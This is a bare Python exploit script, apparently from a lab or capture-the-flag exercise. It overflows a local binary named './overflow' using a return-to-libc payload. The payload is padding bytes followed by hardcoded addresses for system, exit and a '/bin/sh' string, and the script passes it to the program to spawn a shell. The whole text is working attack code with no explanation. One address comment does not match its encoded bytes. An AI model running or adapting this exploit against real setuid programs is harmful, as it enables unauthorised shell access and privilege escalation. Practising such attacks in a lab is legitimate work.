import sys, subprocess
import struct
import os



# setuid = 0x f7 e9 04 40
# system = 0x f7 e0 80 40
# bin_sh = 0x f7 f5 81 2f
# exit   = 0x f7 df a7 b0
# zero   = 0x f7 dc 22 ac

fuzzer = b"\x41"*24
ebx = b"\x42"*4
ebp = b"\x43"*4


sys = b"\x40\x80\xe0\xf7"
setuid = b"\x40\x04\xe9\xf7"
binn = b"\x2f\x81\xf5\xf7"
exit_ = b"\xb0\xa7\xdf\xf7"
zero = b"\xac\x22\xda\xf7"

payload = fuzzer  + ebx  + ebp
payload += sys
payload += exit_
payload += binn


args = ["./overflow",  payload]

subprocess.call(args)
